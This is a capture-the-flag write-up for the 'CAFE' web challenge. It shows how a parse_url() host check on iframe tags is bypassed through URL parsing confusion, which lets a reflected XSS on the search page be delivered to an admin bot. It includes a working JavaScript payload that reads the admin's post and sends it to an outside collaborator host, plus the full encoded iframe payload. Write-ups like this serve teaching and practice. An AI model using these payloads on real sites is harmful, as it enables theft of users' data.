## CAFE - Web Challenge
![alt desc](./chal-des.png)

## Author: p4w

### Solution
The first step was to discover a trivial XSS vulnerability on the `/search?text=<XSS>` path.
The problem is that we can't submit this page directly to the admin, as it will only visit content on the `/read` path.

![alt desc](./trivial_XSS_in_search_page.png)

These are the functionality offered from the web-application:
* read a post
* write a post
* search post
* list all post
* report a post to the admin

By analyzing the source code we can spot that if the post contents have some html tag, then the application will try to sanitize it. The sanitize is done by parsing the user input and allowing only certain tags, in addiction some manipulation on the allowed tags is done. The pictures below show the behaviour of the web application.
![alt desc](./src-filter.png)

So here I immediately think that if we manage to point the __src__ attribute of an __iframe__ tag to the `/search?text=<XSS>` endpoint we can exploit the trivial XSS previously found. The problem is to bypass this check:
```
case 'iframe':
  $src = $element->src;
  $host = parse_url($src)['host'];
  if (strpos($host, 'youtube.com') !== false){
    $result .= '<iframe src="'. str_replace('"', '', $src) .'"></iframe>';
  }
  break;
```

By doing manual fuzzing, I was able to spot a discrepancy between the `parse_url()` __php function__ and the __src__ loading for an html element.
![alt desc](diff.png)

In green is highlighted the part that will be considered the host by the __src__ attribute, instead in __red__ is highlighted the part that is considered the host by the parse_url function.

The figure below shows the different behavior.

__parse_url()__ behavior:

![alt desc](bypass-parse_url-2.png)

__src__ behavior:

![alt desc](bypass-parse_url-poc-1.png)

__src__ behavior in browser:

![alt desc](bypass-parse_url-poc.png)

Now we have a way to bypass the filter since we can submit a payload containing an __iframe__ tag that let the __parse_url__ function return "youtube.com" as required, but when it is loaded from the browser it will point to the vulnerable endpoint.
To grab the flag we need to get the contents of a post submitted by the admin.

XSS payload to steal page contents:
```
<script>var url = "http://3.39.55.38:1929/read?no=1";
var attacker = "http://w419dzeivpt6tx3s1i8eg901rsxil7.burpcollaborator.net/exfil";
var xhr  = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
        fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)))
    }
}
xhr.open('GET', url, true);
xhr.send(null);</script>
```


Final and full payload:
```
<iframe src="http://3.39.55.38:1929\@youtube.com/../search?text=%3c%73%63%72%69%70%74%3e%76%61%72%20%75%72%6c%20%3d%20%22%68%74%74%70%3a%2f%2f%33%2e%33%39%2e%35%35%2e%33%38%3a%31%39%32%39%2f%72%65%61%64%3f%6e%6f%3d%31%22%3b%0a%76%61%72%20%61%74%74%61%63%6b%65%72%20%3d%20%22%68%74%74%70%3a%2f%2f%77%34%31%39%64%7a%65%69%76%70%74%36%74%78%33%73%31%69%38%65%67%39%30%31%72%73%78%69%6c%37%2e%62%75%72%70%63%6f%6c%6c%61%62%6f%72%61%74%6f%72%2e%6e%65%74%2f%65%78%66%69%6c%22%3b%0a%76%61%72%20%78%68%72%20%20%3d%20%6e%65%77%20%58%4d%4c%48%74%74%70%52%65%71%75%65%73%74%28%29%3b%0a%78%68%72%2e%6f%6e%72%65%61%64%79%73%74%61%74%65%63%68%61%6e%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%20%7b%0a%20%20%20%20%69%66%20%28%78%68%72%2e%72%65%61%64%79%53%74%61%74%65%20%3d%3d%20%58%4d%4c%48%74%74%70%52%65%71%75%65%73%74%2e%44%4f%4e%45%29%20%7b%0a%20%20%20%20%20%20%20%20%66%65%74%63%68%28%61%74%74%61%63%6b%65%72%20%2b%20%22%3f%22%20%2b%20%65%6e%63%6f%64%65%55%52%49%28%62%74%6f%61%28%78%68%72%2e%72%65%73%70%6f%6e%73%65%54%65%78%74%29%29%29%0a%20%20%20%20%7d%0a%7d%0a%78%68%72%2e%6f%70%65%6e%28%27%47%45%54%27%2c%20%75%72%6c%2c%20%74%72%75%65%29%3b%0a%78%68%72%2e%73%65%6e%64%28%6e%75%6c%6c%29%3b%3c%2f%73%63%72%69%70%74%3e">
```

Here you can see the exfiltration of the page containing the flag:
![alt desc](exfil-flag.png)

## Reference
* [Exploiting-URL-Parsing-Confusion.pdf](https://claroty.com/wp-content/uploads/2022/01/Exploiting-URL-Parsing-Confusion.pdf)
* [Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)
